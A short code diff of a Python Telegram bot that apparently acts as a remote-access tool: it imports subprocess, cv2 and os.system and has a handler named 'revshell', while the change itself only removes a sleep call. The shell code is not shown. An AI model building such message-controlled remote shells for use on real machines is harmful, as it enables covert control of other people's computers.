@@ -4,7 +4,6 @@ from aiogram.utils import executor
 import subprocess
 import cv2
 from os import system
-from time import sleep
 
 bot = Bot('token')
 dp = Dispatcher(bot)
@@ -39,4 +38,3 @@ async def revshell(message: types.Message):
 
 if __name__ == '__main__':
     executor.start_polling(dp)
-    sleep(10)
